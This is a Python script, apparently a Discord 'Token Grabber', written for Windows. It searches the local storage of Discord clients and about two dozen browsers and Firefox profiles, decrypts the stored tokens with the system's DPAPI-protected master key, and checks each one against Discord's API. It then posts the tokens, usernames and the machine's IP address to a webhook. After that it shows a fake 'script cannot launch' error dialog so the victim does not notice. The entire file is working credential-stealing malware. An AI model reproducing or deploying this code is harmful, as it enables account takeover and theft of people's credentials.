import os
import json
import requests
from Crypto.Cipher import AES
import base64
import re
from win32crypt import CryptUnprotectData
import socket
import tkinter as tk
from tkinter import messagebox


URL = "WEBHOOK_URL"

def erreur():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Erreur", "Le script ne peut pas se lancer !")
    root.wait_window(root)

def send_tok():
    
    class YourToken:
        def __init__(self):
            upload_tokens().upload()
    
    class extract_tokens:
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
            self.tokens, self.uids = [], []
            self.extract()
        
        def extract(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }
            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token})
            return r.status_code == 200

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return None
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
            return master_key

    class upload_tokens:
        def __init__(self):
            self.tokens = extract_tokens().tokens
        def upload(self):
            total_tokens = len(self.tokens)
            if not self.tokens:
                return
            for idx, token_discord in enumerate(self.tokens, start=1):
                headers = {'Authorization': token_discord, 'Content-Type': 'application/json'}
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                res_json = res.json()
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'


                def get_local_ip():
                    hostname = socket.gethostname()
                    local_ip = socket.gethostbyname(hostname)
                    return local_ip
                    


                computer_info = {
                    "Token": f"||```{token_discord}```||",
                }
                embed_data = {
                    "username": "Token Grabber",
                    "embeds": [
                        {
                            "title": f"Token de {user_name} | ||{get_local_ip()}||",
                            "color": 0xccffff,
                            "fields": [{"name": key, "value": str(value), "inline": False} for key, value in computer_info.items()],
                        }
                    ]
                }
                headers = {'Content-Type': 'application/json'}
                response = requests.post(f"{URL}", data=json.dumps(embed_data), headers=headers)


    YourToken()


send_tok()
erreur()